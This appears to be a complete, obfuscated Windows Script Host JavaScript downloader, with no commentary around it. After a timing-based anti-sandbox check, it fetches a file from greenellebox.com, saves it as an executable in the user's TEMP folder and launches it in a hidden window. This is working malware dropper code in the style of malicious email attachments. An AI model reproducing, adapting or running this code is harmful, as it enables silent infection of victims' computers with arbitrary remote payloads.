var eE = false;
var vF = "CreateObject";
var Uc = function n() {return WScript[vF]("WScript.Shell");}(), Ao = 11;
var sp = "MSXML2.XMLHTTP";
var GN = 2123213;
var yG = 0;
function Y(N0){Uc["Run"](N0, yG, yG);};
function D(){return "" + sp;};
function c(g, f){yG = yG * 1; return g - f;};
function B(){return vF;};
/*@cc_on
  @if (@_win32 || @_win64)
    eE = true;
  @end
@*/
if (eE)
{
var fV = "";
function i0(){return 22;};
var z0 = 0; var a = 0;
function jT()
{
var d = new this["Date"]();
var n0 = d["getUTCMilliseconds"]();
WScript["Sleep"](i0());
var d = new this["Date"]();
var N = d["getUTCMilliseconds"]();
WScript["Sleep"](i0());
var d = new this["Date"]();
var HR = d["getUTCMilliseconds"]();
var z0 = "D0";
z0 = c(N, n0);
var a = "CQ";
a = c(HR, N);
fV = "open";
return c(z0, a);
}
var gR = false;
var w = false;
for (var AK = yG; AK < i0() * 1; AK++){if (jT() != yG){
gR = true; 
a = "31" + 11 * z0 + a; 
w = true; 
break;
}}
function F() {return ((gR == true) && (gR == w)) ? 1 : yG;};
if (gR && F() && w){
function i() {return Uc["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "i8hLNmDD9sioD.exe";};
 Ft = D();
 V = WScript[vF](Ft);
 var PJ = 1;
 while (PJ){
try {
V[fV]("GET", "http://greenellebox.com/a1odk", false);
V["send"]();
XC = "Sleep";
for (;;){WScript[XC](i0() * 11); if (V["readystate"] >= 2 * 2) break;};
PJ = yG;
} catch(ZH){};
}
function wL(b) {var z = (1, 2, 3, 4, 5, b); return z;};
Fl = WScript[B()]("ADODB.Stream");
Ft = Fl;
Ft[fV]();
Ft["type"] = wL(1);
Ft["write"](V["ResponseBody"]);
Fl["position"] = wL(yG);
Ft["Save" + "ToFile"](i(), 2);
Fl["c"+"lose"]();
I = i();
Y(I);
}
}

